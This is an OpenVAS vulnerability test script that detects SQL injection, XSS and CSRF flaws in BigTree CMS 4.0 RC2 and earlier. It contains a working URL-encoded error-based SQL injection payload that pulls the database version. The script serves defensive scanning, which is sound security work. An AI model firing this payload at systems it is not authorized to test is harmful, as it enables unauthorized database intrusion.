###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bigtree_cms_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# BigTree CMS Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if (description)
{
  script_id(803869);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-4879", "CVE-2013-4880", "CVE-2013-5313", "CVE-2013-4881");
  script_bugtraq_id(61699, 61701, 61839, 61702);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-19 12:51:13 +0530 (Mon, 19 Aug 2013)");
  script_name("BigTree CMS Multiple Vulnerabilities");

  tag_summary =
"This host is installed with BigTree CMS and is prone to multiple
vulnerabilities";

  tag_vuldetect =
"Send a crafted HTTP GET request and check whether it is able to read the
database version or not.";

  tag_insight =
"Multiple flaws are due to,
- Improper sanitation of user-supplied input passed via the
  URL to the site/index.php script and 'module' parameter upon submission
  to '/admin/developer/modules/views/add/index.php' script
- Cross-site request forgery (CSRF) vulnerability in
core/admin/modules/users/create.php and core/admin/modules/users/update.php";

  tag_impact =
"Successful exploitation will allow remote attackers to insert arbitrary HTML
or script code, which will be executed in a user's browser session in the
context of an affected site, hijack user session or manipulate SQL queries
by injecting arbitrary SQL code.";

  tag_affected =
"BigTree CMS version 4.0 RC2 and prior";

  tag_solution =
"No solution or patch is available as of 19th August, 2013. Information
regarding this issue will updated once the solution details are available.
For updates refer to http://www.bigtreecms.org";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/96007");
  script_xref(name : "URL" , value : "http://www.osvdb.com/96008");
  script_xref(name : "URL" , value : "http://www.osvdb.com/96009");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/86287");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23165");
  script_summary("Check if BigTree CMS is vulnerable to sql injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
req = "";
res = "";
port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/bigtree", "/bigtreecms", "/cms", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir,"/site/index.php/admin/login/index.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if('bigtreecms' >< res && 'Fastspot<' >< res)
  {
    url = dir + "/site/index.php/%27and%28select%201%20from%28select%20"+
                "count%28*%29%2cconcat%28%28select%20concat%28version%2"+
                "8%29%29%29%2cfloor%28rand%280%29*2%29%29x%20from%20inf"+
                "ormation_schema.tables%20group%20by%20x%29a%29and%27";

    ## Confirm exploit worked by checking the response
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"<b>Fatal error</b>:  Uncaught exception.*invalid sqlquery\(\).*Duplicate entry .([0-9.]+)"))
    {
      security_hole(port);
      exit(0);
    }
  }
}
